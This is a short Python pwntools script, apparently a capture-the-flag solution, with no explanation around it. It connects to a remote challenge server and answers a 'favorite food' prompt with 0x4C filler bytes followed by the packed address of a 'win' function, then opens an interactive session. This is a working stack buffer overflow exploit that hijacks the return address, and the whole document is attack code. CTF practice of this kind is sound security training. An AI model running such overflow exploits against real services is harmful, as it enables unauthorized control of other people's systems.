from pwn import *

r = remote("challs.pwnoh.io", 13401)

win = 0x80491E6

r.sendlineafter(b"What is your favorite food?\n", b"A" * 0x4C + p32(win))

r.interactive()
